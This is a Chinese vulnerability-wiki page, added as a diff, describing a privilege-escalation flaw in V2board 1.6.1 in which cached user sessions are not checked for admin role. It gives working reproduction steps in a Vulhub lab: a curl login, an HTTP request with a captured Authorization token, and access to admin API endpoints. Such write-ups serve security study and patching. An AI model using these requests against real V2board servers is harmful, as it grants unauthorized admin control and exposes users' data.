@@ -1,0 +1,161 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+  
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    
+    <meta name="author" content="内部使用">
+    <link rel="canonical" href="https://secnn.com/%E4%B8%AD%E9%97%B4%E4%BB%B6%E6%BC%8F%E6%B4%9E/V2board%201.6.1%20%E6%8F%90%E6%9D%83%E6%BC%8F%E6%B4%9E/">
+    <link rel="shortcut icon" href="../../favicon.ico">
+    
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" />
+    <title>V2board 1.6.1 提权漏洞 - SecNN-Wiki漏洞库管理系统&网络安全知识库-本Wiki所有信息来源于公开漏洞数据库</title>
+    <link href="../../css/bootstrap-3.3.7.min.css" rel="stylesheet">
+    <link href="../../css/font-awesome-4.7.0.css" rel="stylesheet">
+    <link href="../../css/base.css" rel="stylesheet">
+    <link rel="stylesheet" href="../../css/highlight.css">
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+        <script src="https://oss.maxcdn.com/libs/html5shiv/3.7.0/html5shiv.js"></script>
+        <script src="https://oss.maxcdn.com/libs/respond.js/1.3.0/respond.min.js"></script>
+    <![endif]-->
+
+    <script src="../../js/jquery-3.2.1.min.js"></script>
+    <script src="../../js/bootstrap-3.3.7.min.js"></script>
+    <script src="../../js/highlight.pack.js"></script>
+    
+    <base target="_top">
+    <script>
+      var base_url = '../..';
+      var is_top_frame = false;
+        
+        var pageToc = [
+          {title: "V2board 1.6.1 \u63d0\u6743\u6f0f\u6d1e", url: "#_top", children: [
+              {title: "\u6f0f\u6d1e\u63cf\u8ff0", url: "#_1" },
+              {title: "\u73af\u5883\u642d\u5efa", url: "#_2" },
+              {title: "\u6f0f\u6d1e\u590d\u73b0", url: "#_3" },
+          ]},
+        ];
+
+    </script>
+    <script src="../../js/base.js"></script>
+      <script src="../../search/main.js"></script> 
+</head>
+
+<body>
+<script>
+if (is_top_frame) { $('body').addClass('wm-top-page'); }
+</script>
+
+
+
+<div class="container-fluid wm-page-content">
+  <a name="_top"></a>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../VMware%20Spring%20Security%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-22978/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../VMware%20Spring%20Security%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-22978/" class="btn btn-xs btn-link">
+        VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Tomcat8 弱口令+后台getshell漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    
+
+    <h1 id="v2board-161">V2board 1.6.1 提权漏洞<a class="headerlink" href="#v2board-161" title="Permanent link">&para;</a></h1>
+<h2 id="_1">漏洞描述<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h2>
+<p>V2board是一个多用户代理工具管理面板。在其1.6.1版本中，引入了对于用户Session的缓存机制，服务器会将用户的认证信息储存在Redis缓存中。</p>
+<p>但由于读取缓存时没有校验该用户是普通用户还是管理员，导致普通用户的认证信息即可访问管理员接口，造成提权漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0">https://github.com/v2board/v2board/commit/5976bcc65a61f7942ed4074b9274236d9d55d5f0</a></li>
+</ul>
+<h2 id="_2">环境搭建<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
+<p>Vulhub执行如下命令启动一个V2board 1.6.1版本服务器：</p>
+<div class="highlight"><pre><span></span><code>docker-compose up -d
+</code></pre></div>
+<p>服务启动后，访问<code>http://your-ip:8080</code>即可查看到其登录页面。</p>
+<p><img alt="image-20230504112004533" src="../images/image-20230504112004533.png" /></p>
+<h2 id="_3">漏洞复现<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
+<p>复现该漏洞，必须注册或找到一个普通用户账号。注册完成后，我们发送如下请求进行登录（将其中账号密码替换成你注册时使用的信息）：</p>
+<div class="highlight"><pre><span></span><code>curl -i -s -k -XPOST --data-binary &quot;email=threeki%40abc.com&amp;password=threeki@wh0am1&quot; http://your-ip:8080/api/v1/passport/auth/login
+</code></pre></div>
+<p>服务器会返回当前用户的认证信息“auth_data”：</p>
+<p><img alt="image-20230504112219108" src="../images/image-20230504112219108.png" /></p>
+<p>拷贝这个认证信息，并替换到如下数据包的<code>Authorization</code>头中，发送：</p>
+<div class="highlight"><pre><span></span><code>GET /api/v1/user/info HTTP/1.1
+Host: your-ip:8080
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/111.0.0.0 Safari/537.36
+Accept: */*
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
+Connection: close
+Authorization: dGhyZWVraUBhYmMuY29tOiQyeSQxMCRnb1UzUDBCL25ocTg2blZvYTUvRm5PbVpKUG5yTFptZ2hJa3FUNUdRYndVL003WXNpdVlqMg==
+</code></pre></div>
+<p><img alt="image-20230504112604993" src="../images/image-20230504112604993.png" /></p>
+<p>这一步的目的是让服务器将我们的Authorization头写入缓存中。</p>
+<p>最后，只需要带上这个Authorization头，即可使用所有管理员API了。例如<code>http://your-ip:8080/api/v1/admin/user/fetch</code></p>
+<p><img alt="image-20230504112709503" src="../images/image-20230504112709503.png" /></p>
+
+  <br>
+    
+
+    
+    
+      
+    
+
+  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
+    
+    <div class="wm-article-nav pull-right">
+      <a href="../VMware%20Spring%20Security%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-22978/" class="btn btn-xs btn-default pull-right">
+        Next
+        <i class="fa fa-chevron-right" aria-hidden="true"></i>
+      </a>
+      <a href="../VMware%20Spring%20Security%20%E8%BA%AB%E4%BB%BD%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%20CVE-2022-22978/" class="btn btn-xs btn-link">
+        VMware Spring Security 身份认证绕过漏洞 CVE-2022-22978
+      </a>
+    </div>
+    
+    <div class="wm-article-nav">
+      <a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-default pull-left">
+        <i class="fa fa-chevron-left" aria-hidden="true"></i>
+        Previous</a><a href="../Tomcat8%20%E5%BC%B1%E5%8F%A3%E4%BB%A4%2B%E5%90%8E%E5%8F%B0getshell%E6%BC%8F%E6%B4%9E/" class="btn btn-xs btn-link">
+        Tomcat8 弱口令+后台getshell漏洞
+      </a>
+    </div>
+    
+  </div>
+
+    <br>
+</div>
+
+<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
+  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
+</footer>
+
+</body>
+</html>
